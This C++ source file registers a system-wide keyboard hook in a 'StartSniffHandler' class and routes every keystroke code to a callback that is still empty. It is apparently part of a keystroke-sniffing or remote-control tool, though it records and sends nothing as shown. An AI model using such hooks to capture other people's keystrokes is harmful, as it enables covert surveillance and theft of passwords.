#include "StartSniffHandler.hpp"

#include "Processes/ActiveWindowsHook.hpp"
#include "Processes/WindowsHook.hpp"

void StartSniffHandler::run()
{
	ActiveWindowsHook::register_hook(
		WindowsHook::Type::KEYBOARD,
		[this](const int key_code)
		{
			callback(key_code);
		}
	);
}

void StartSniffHandler::callback(int key_code)
{
}
